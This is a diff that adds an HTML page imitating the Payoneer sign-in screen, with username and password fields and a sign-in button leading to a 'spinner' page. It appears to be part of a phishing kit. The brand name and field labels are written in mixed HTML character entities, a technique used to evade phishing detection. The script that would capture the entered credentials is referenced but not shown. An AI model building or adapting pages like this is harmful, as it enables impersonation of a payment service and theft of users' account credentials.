@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="msapplication-TileColor" content="#ff4800">
+    <title>P&#97;y&#111;n&#101;er: L&#111;gin</title>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/login.css">
+    <link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700" rel="stylesheet">
+    <link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico" />
+    <link rel="icon" type="image/x-icon" href="img/favicon.ico" />
+    <link rel="icon" type="image/png" href="img/favicon-32x32.png" sizes="32x32" />
+    <link rel="icon" type="image/png" href="img/favicon-16x16.png" sizes="16x16" />
+    <!--[if lt IE 9]> 
+           <script src="js/html5shiv.min.js"></script>
+           <script src="js/respond.min.js"></script>
+        <![endif]-->
+</head>
+
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <div class="loginContainer col-sm-3 hidden-xs">
+                <img class="center-block logo" src="img/logo.svg" alt="logo">
+                <div class="margin"></div>
+                <div class="loginform center-block">
+                    <form class="form">
+                        <div class="user">
+                            <input type="text" id="username" onblur="funct()" onkeyup="check()" class="center-block" name="username" placeholder autocomplete="off" autocorrect="off" aria-required="true" required><label class="userInputLable" for="username" title="username">Us&#101;rn&#97;me</label>
+                            <img src="img/exclamation.png" alt="exclamation" height="18" width="16">
+                            <div class="messege">
+                                <span class="messegetext">In most c&#97;ses this is the em&#97;il &#97;ddr&#101;ss asso&#99;iated with your P&#97;y&#111;neer &#97;&#99;&#99;ount.</span>
+                            </div>
+                        </div>
+                        <div id="userReq" class="req">Us&#101;rn&#97;me is required</div>
+                        <div class="pass">
+                            <input type="password" id="password" onblur="functi()" onkeyup="checke()" class="center-block" name="Password" placeholder minlength="4" maxlength="30" autocomplete="off" autocorrect="off" aria-required="true" required>
+                            <label class="passInputLable" for="Password" title="Password">P&#97;ssw&#111;rd</label>
+                        </div>
+                        <div id="passReq" class="req1">P&#97;ssw&#111;rd is required</div>
+                        <a href="#">F&#111;rg&#111;t p&#97;ssword?</a>
+                        <div class="margin"></div>
+                        <button id="bt" class="singIn" onkeydown="func(event)"><a href="spinner.html">Si&#103;n in</a></button>
+                        <p class="singUp">New to P&#97;y&#111;n&#101;er?<a href="#"> Si&#103;n up!</a></p>
+                    </form>
+                </div>
+                <div class="footer center-block">
+                    <p>© 2005-2018 P&#97;y&#111;ne&#101;r In&#99;.</p>
+                    <a class="contact" href="#"> &#67;ont&#97;ct Us</a>
+                    <a class="about" href="#"> &#65;bout</a>
+                </div>
+            </div>
+            <div class="p-loginContainer hidden-xl hidden-lg hidden-md hidden-sm">
+                <img class="center-block p-logo" src="img/logo.svg" alt="logo">
+                <div class="margin"></div>
+                <div class="p-loginform center">
+                    <form class="p-form">
+                        <div class="user">
+                            <input type="text" id="username" onblur="funct()" onkeyup="check()" class="center-block" name="username" placeholder autocomplete="off" autocorrect="off" aria-required="true" required><label class="userInputLable" for="username" title="username">Us&#101;rn&#97;me</label>
+                            <img src="img/exclamation.png" alt="exclamation" height="18" width="16">
+                            <div class="messege">
+                                <span class="messegetext">In most c&#97;ses this is the em&#97;il &#97;ddr&#101;ss asso&#99;iated with your P&#97;y&#111;neer &#97;&#99;&#99;ount.</span>
+                            </div>
+                        </div>
+                        <div id="userReq" class="req">Us&#101;rn&#97;me is required</div>
+                        <div class="pass">
+                            <input type="password" id="password" onblur="functi()" onkeyup="checke()" class="center-block" name="Password" placeholder minlength="4" maxlength="30" autocomplete="off" autocorrect="off" aria-required="true" required>
+                            <label class="passInputLable" for="Password" title="Password">P&#97;ssw&#111;rd</label>
+                        </div>
+                        <div id="passReq" class="req1">P&#97;ssw&#111;rd is required</div>
+                        <a href="#">F&#111;rg&#111;t p&#97;ssword?</a>
+                        <div class="margin"></div>
+                        <button id="bt" class="singIn" onkeydown="func(event)"><a href="spinner.html">Si&#103;n in</a></button>
+                        <p class="singUp">New to P&#97;y&#111;n&#101;er?<a href="#"> Si&#103;n up!</a></p>
+                    </form>
+                </div>
+                <div class="p-footer">
+                    <p>© 2005-2018 P&#97;y&#111;ne&#101;r In&#99;.</p>
+                    <a class="contact" href="#"> &#67;ont&#97;ct Us</a>
+                    <a class="about" href="#"> &#65;bout</a>
+                </div>
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div class="row">
+            <div class="background col-sm-9 hidden-xs"></div>
+            <div class="clearfix"></div>
+        </div>
+    </div>
+
+    <script src="js/jquery-3.3.1.min.js"></script>
+    <script src="js/script.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+</body>
+
+</html>
